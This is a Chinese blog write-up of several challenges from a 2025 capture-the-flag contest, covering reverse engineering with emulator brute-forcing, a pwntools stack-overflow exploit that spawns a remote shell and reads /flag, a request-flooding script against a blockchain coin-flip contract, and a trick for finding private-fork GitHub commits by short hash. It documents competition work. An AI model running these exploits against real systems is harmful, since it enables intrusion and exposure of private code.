---
title: 2025 第八届“强网”拟态 部分Writeup
comments: true
date: 2025-10-26 23:10:12
tags:
  - CTF
  - 逆向
categories:
  - 技术
cover: https://img.0a0.moe/od/01tklsjzciheijjvav7na2balh7fvzwv5w
---

> 封面：[Pixiv@Nya](https://www.pixiv.net/users/100585577)

依旧随便更新一下，对这场比赛的感觉就是爆爆爆

## Mobile

 ### EZMiniApp

微信小程序逆向，前阵子湾区杯也做过。同样使用https://github.com/threecha/wxappUnpacker解包，在chunk_0.appservice.js发现校验flag逻辑，js有一定混淆，还有报错，懒得修，把加密部分丢给AI直接出结果

```python
# decrypt_flag.py
cipher = [1, 33, 194, 133, 195, 102, 232, 104, 200, 14, 8, 163, 131, 71, 68, 97, 2, 76, 72, 171, 74, 106, 225, 1, 65]
key = "newKey2025!"

# 计算位移量 c = sum(key_bytes) % 8
key_bytes = [ord(ch) for ch in key]
c = sum(key_bytes) % 8

def ror8(val, bits):
    """8-bit 右循环移位（Rotate Right）"""
    bits = bits % 8
    return ((val >> bits) | ((val << (8 - bits)) & 0xFF)) & 0xFF

def decrypt(cipher_bytes, key_bytes, rotate_bits):
    s = len(key_bytes)
    out = []
    for i, v in enumerate(cipher_bytes):
        # 加密时是先 XOR 再左循环移位 c，
        # 解密应先右循环移位 c（还原），再 XOR key
        u = ror8(v, rotate_bits)
        plain_byte = u ^ key_bytes[i % s]
        out.append(plain_byte)
    return bytes(out)

plain_bytes = decrypt(cipher, key_bytes, c)

print("key:", key)
print("rotate bits (c):", c)
print("Decrypted bytes (hex):", plain_bytes.hex())
# 尝试以 utf-8 解码，若失败则用 latin-1 保底
try:
    decoded = plain_bytes.decode('utf-8')
except UnicodeDecodeError:
    decoded = plain_bytes.decode('latin-1')
print("Decrypted string:", decoded)
# flag{JustEasyMiniProgram}
```

## Reverse

这次所有逆向题都是单字节加密，反倒过程看起来都弄得挺复杂，所以直接爆就完事了，抽象完了

### HyperJump

base+0x4350有个反调试函数，patch掉后，调试发现可以在base+0x13F3比较的位置逐字节爆破

考虑使用Qiling模拟执行爆破

```python
from qiling import *
from qiling.extensions import pipe
from qiling.const import QL_VERBOSE

target = [0x4B, 0xD7, 0x58, 0xB8, 0xDF, 0xAA, 0xE3, 0xD3, 0x27, 0xDC, 0x71, 0x51, 0x22, 0x98, 0xBB, 0x9E, 0x5F, 0x59, 0xA1, 0xB3, 0x92, 0x7E, 0xFC, 0xBA]

now = []

solutions = []

def hook(ql: Qiling):
    global reg_al
    reg_al = ql.arch.regs.read("AL")
    now.append(reg_al)
    # print(reg_al)

def run(input_str:str):
    path = ['./qiling-rootfs/x8664_linux_glibc2.39/hyperjump']
    rootfs = "./qiling-rootfs/x8664_linux_glibc2.39"
    ql = Qiling(path, rootfs, multithread=True, verbose=QL_VERBOSE.DISABLED)
    ql.os.stdin = pipe.SimpleInStream(0)
    ql.os.stdin.write((input_str+'\n').encode())
    ql.os.stdout = pipe.SimpleOutStream(1)
    base = ql.mem.get_lib_base('hyperjump')
    ql.hook_address(hook, base + 0x13f3)
    ql.run()

if __name__ == '__main__':
    flag = ['1'] * 24
    for i in range(24):
        now_solution = []
        if i > 0:
            for ps in solutions:
                flag[i-1] = ps[0]
        for c in range(32, 127):
            flag[i] = chr(c)
            input_str = ''.join(flag)
            # print(f'[*] Trying: {input_str}')
            now = []
            run(input_str)
            if now[i] == target[i]:
                print(f'[+] Found char at position {i}: {chr(c)}')
                now_solution.append(chr(c))
        solutions.append(now_solution)
    print(solutions)
# [['f'], ['X', 'l'], ['a'], ['g'], ['A', '{'], [']', 'm'], ['4'], ['!', 'i', 'z'], ['3'], ['d'], ['_'], ['v'], ['m'], ['_'], ['j'], ['u'], ['m'], ['p'], ['5'], ['_'], ['_'], ['4'], ['2'], ['}']]
```

```python
import hashlib

solutions = [['f'], ['X', 'l'], ['a'], ['g'], ['A', '{'], [']', 'm'], ['4'], ['!', 'i', 'z'], ['3'], ['d'], ['_'], ['v'], ['m'], ['_'], ['j'], ['u'], ['m'], ['p'], ['5'], ['_'], ['_'], ['4'], ['2'], ['}']]
target_md5 = "91b713899496c938c4930d6194929ebc"

# 遍历所有可能的组合，匹配md5
def dfs(position, current_str):
    if position == len(solutions):
        # 计算md5
        md5_hash = hashlib.md5(current_str.encode()).hexdigest()
        if md5_hash == target_md5:
            print(f'[+] Found matching string: {current_str}')
        return
    for char in solutions[position]:
        dfs(position + 1, current_str + char)

if __name__ == '__main__':
    dfs(0, "")
# flag{m4z3d_vm_jump5__42}
```

### Icall

Binary Ninja可以把.data段设为只读方便分析，但好像只有部分函数有用，有些函数是通过arg传参进去计算的

.init_array第二个函数0x401130起了个循环反调试线程，可以patch掉

0x401c40看起来只是些变换，0x401b40看起来异或之类的像RC4可以逐字节爆破（后面再看结合flag好像确实是3轮RC4但S盒共用）

```python
from qiling import *
from qiling.extensions import pipe
from qiling.const import QL_VERBOSE

target = [0xf7, 0x88, 0xc3, 0x29, 0x36, 0x64, 0x63, 0x29, 0xc7, 0x7f, 0x1c, 0xab, 0x71, 0xe0, 0x03, 0x49, 0x73, 0xcb, 0x0a, 0xaf, 0x0c, 0x87, 0x84, 0x8e, 0x5a, 0x64, 0xc7, 0xac, 0x2a, 0x67]

def hook(ql: Qiling):
    global byte_value
    final_ptr = ql.arch.regs.read("RDI")
    byte_value = ql.mem.read(final_ptr, 30)
    # print("Extracted bytes:", byte_value)

def run(input_str:str):
    path = ['./qiling-rootfs/x8664_linux_glibc2.39/Icall']
    rootfs = "./qiling-rootfs/x8664_linux_glibc2.39"
    ql = Qiling(path, rootfs, multithread=True, verbose=QL_VERBOSE.DISABLED)
    ql.os.stdin = pipe.SimpleInStream(0)
    ql.os.stdin.write((input_str+'\n').encode())
    ql.os.stdout = pipe.SimpleOutStream(1)
    ql.hook_address(hook, 0x4025dc)
    ql.run()

if __name__ == '__main__':
    flag = ['A'] * 30
    for i in range(30):
        for c in range(32, 127):
            flag[i] = chr(c)
            input_str = ''.join(flag)
            print(f'[*] Trying: {input_str}')
            run(input_str)
            if list(byte_value)[:i+1] == target[:i+1]:
                print(f'[+] Found char at position {i}: {chr(c)}')
                break
    print('Final flag:', ''.join(flag))
# flag{r0uNd_Rc4_Aff1neEnc1yp7!} 
```

## Pwn

### Babystack

```c
int pwn()
{
  char s[24]; // [rsp+0h] [rbp-120h] BYREF
  char v2[248]; // [rsp+18h] [rbp-108h] BYREF
  __int64 v3; // [rsp+110h] [rbp-10h]

  memset(s, 0, 0x110u);
  v3 = 180097847;
  printf("Enter your flag1:");
  read(0, s, 0x18u);
  printf("Enter your flag2:");
  read(0, v2, 0x100u);
  printf("Nice!, %s, your flag2 is %s.\n", s, v2);
  if ( v3 != 20150972 )
    return puts("you are a good boy.");
  puts("you are also a good boy.");
  return system("/bin/sh");
}
```

v2写入覆盖到v3然后get shell

```python
#!/usr/bin/env python3
from pwn import *

LOCAL_BIN = "./babystack"
REMOTE = True

context.update(arch='amd64', os='linux', log_level='debug')

# 目标值 20150972 (decimal) == 0x1337abc
TARGET = 20150972

def exploit_local():
    p = process(LOCAL_BIN)
    return exploit_io(p)

def exploit_remote():
    p = remote("pwn-c5df5b166d.challenge.xctf.org.cn", 9999, ssl=True)
    return exploit_io(p)

def exploit_io(p):
    flag1 = b"FLAG1\n"
    p.recvuntil(b"Enter your flag1:")
    p.send(flag1)
    padding = b"A" * 248
    visible = b"MYFLAG\0"
    fill = visible + b"B"*(248 - len(visible))

    payload = fill + p64(TARGET)
    p.recvuntil(b"Enter your flag2:")
    p.send(payload)

    p.send(b'cat /flag\n')
    p.interactive()
    return

if __name__ == "__main__":
    if REMOTE:
        exploit_remote()
    else:
        exploit_local()
```

![img](https://img.0a0.moe/od/01tklsjzblewvqeelqnngy27geys6fud4z)

## 低空经济网络安全

### The Hidden Link

把流量里9字节开头是B的后面4字节提出来

flag {dr0 t_c0 ntr0 _h4c n3_f l1gh k3d} ll3r

重新排列一下

flag{dr0n3_fl1ght_c0ntr0ll3r_h4ck3d} 

## Crypto

### blockchain

审计合约代码

```solidity
pragma solidity ^0.4.25;

contract CoinFlip {
  event ConsecutiveWins(address,uint256);
  uint256 public consecutiveWins;
  uint256 private consecutiveWinNumber=10;
  address private winer;
  uint256 private lastNance;
  string private key;
  bool private isStart;

  constructor(string memory _key) {
    require(keccak256(_key)!=keccak256(""),"please input key");
    consecutiveWins = 0;
    key=_key;
    isStart=false;
  }

   modifier onlyEOA()  {
    require(msg.sender==tx.origin,"only EOA");
    _;
  }

  modifier verifyConsecutiveWins(){
    require(isStart==true,"Game is not over");
    require(consecutiveWins==consecutiveWinNumber&&winer!=address(0),"no winner");
    _;
  }

  function flip(bool _guess) public onlyEOA returns (bool,string) {
    require(isStart==false,"Game over!!");
    uint256 nonce=uint256(keccak256(abi.encode(keccak256(lastNance),block.timestamp,blockhash(block.number - 1),block.difficulty,keccak256(tx.origin),keccak256(msg.sender))));
    if (lastNance == nonce) {
      revert();
    }

    lastNance = nonce;
    uint256 coinFlip = uint256(uint256(nonce) % 2);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      if (consecutiveWins==consecutiveWinNumber){
        winer=msg.sender;
        emit ConsecutiveWins(msg.sender,consecutiveWinNumber);
        isStart=true;
        return (true,key);
      }
      return (true,"");
    } else {
      consecutiveWins = 0;
      return (false,"");
    }
  }
  function verify() verifyConsecutiveWins public view returns(address,uint256,string) {
    return (winer,consecutiveWinNumber,key);
  }
}
```

猜硬币，但是限制了调用必须是用户直接调用

只有一个不知道什么的平台，没有rpc，因此不能读slot，所以就只能反复合约调用请求看运气了

```javascript
// loop_fetch.js
const fetch = require("node-fetch"); // npm install node-fetch@2

const url = "http://web-43ad37eb4f.challenge.xctf.org.cn/WeBASE-Front/trans/handle";
const headers = {
  "accept": "application/json, text/plain, */*",
  "accept-language": "zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7,en-GB;q=0.6,en-US;q=0.5",
  "content-type": "application/json",
  "proxy-connection": "keep-alive",
  "sec-gpc": "1",
  "x-requested-with": "XMLHttpRequest"
};

const body = {
  groupId: "1",
  user: "0x9908bd276177e5b8f87c68e8d0097eab1959023d",
  contractName: "CoinFlip",
  contractPath: "/",
  version: "",
  funcName: "flip",
  funcParam: ["true"],
  contractAddress: "0x27f714e5ac1370580776803bae02dd2fb6ddb8f6",
  contractAbi: [
    {
      constant: false,
      inputs: [{ name: "_guess", type: "bool", value: "true" }],
      name: "flip",
      outputs: [
        { name: "", type: "bool" },
        { name: "", type: "string" }
      ],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
      funcId: 0
    }
  ],
  useAes: false,
  useCns: false,
  cnsName: ""
};

async function sendRequest() {
  try {
    const res = await fetch(url, {
      method: "POST",
      headers,
      body: JSON.stringify(body)
    });
    const text = await res.text();
    console.log(`[${new Date().toLocaleTimeString()}] Response:`, text);
  } catch (e) {
    console.error(`[${new Date().toLocaleTimeString()}] Error:`, e.message);
  }
}

// 每秒循环一次，可根据需要修改间隔或次数
(async () => {
  const times = Infinity; // 或改为一个数字，例如 100
  for (let i = 0; i < times; i++) {
    await sendRequest();
    await new Promise(r => setTimeout(r, 10));
  }
})();
```

300多次就成功了

![img](https://img.0a0.moe/od/01tklsjzcbh37wi5x76be2hmgfqlugyo5j)

拿到了部署合约时的key

```
buiqhrvilHwigdClBuiTucduZnXmrLoHleieggbawsgsgcAyaFekhqWmAvqTocwhBuiiARfyurergyhNprwePcHcurmQsmGmqopirdhliaWpdRwIvhRphqgNproiBgGevBaRwfsyifiAlRvQpvglwfsemLQeBzswpnrkhbwmiAsXkcFjWvrXlLtuDbVsiRvyiqStWgcHwsxlLqqilrfCwfCmmqiWlPwhogSxuybMuvXmPncLbnrxPcGmitiWzgHbWhxXkcgfQtlxhQhxiakiUmtNprmvPcGmitiWecWhoeiegzMjWymxlaofwefyVgbyaFvmYyzmmGg
```

根据题意是要找古典密码的key，因此用https://www.dcode.fr/identification-chiffrement识别出是vigenere，然后自动解密

![img](https://img.0a0.moe/od/01tklsjzbfqgsh7huwpff375q3sj56mwuo)

大写INEEDYOU不行改成小写过了，flag{ineedyou}

## Misc

### Ciallo_Encrypt

得知放到仓库，找到仓库https://github.com/Yu2ul0ver/Ciallo_Encrypt0r

![img](https://img.0a0.moe/od/01tklsjzch5cvrcyf6tzakiw67qe4fhkxq)

![img](https://img.0a0.moe/od/01tklsjza5qrm66ufjnzfiert5ule56doy)

找到后台的账号密码，登录后台可以看到最开始的加密数据

然后加密的逻辑根据更新信息可知放到了私密的fork里，由于GitHub平台的特性，可以通过修改commit hash看到同一base下的所有commit，无论公开还是私密，而commit hash链接最短只需要4位，因此可以通过爆破找到“私密”的commit

![img](https://img.0a0.moe/od/01tklsjzano3wy3chr2vhkbndsfl72lkah)

https://github.com/Yu2ul0ver/Ciallo_Encrypt0r/commit/887c57ac0b19946e32674b45ca71b219e6e08a94

从中可以看到加密逻辑，从中倒退计算即可得到后台数据中最初加密的原始flag
